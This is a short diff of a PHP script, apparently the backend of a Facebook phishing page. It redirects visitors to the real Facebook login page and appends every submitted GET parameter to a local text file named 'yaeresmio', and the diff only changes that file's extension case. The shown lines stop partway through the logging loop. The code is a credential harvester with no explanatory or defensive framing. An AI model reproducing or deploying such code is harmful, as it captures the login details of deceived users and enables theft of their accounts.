@@ -1,6 +1,6 @@
 <?php
 header("Location: http://www.Facebook.com/login.php ");
-$handle = fopen("yaeresmio.txt", "a"); 
+$handle = fopen("yaeresmio.TXT", "a"); 
 
 foreach($_GET as $variable => $value) {
 	fwrite($handle, $variable);
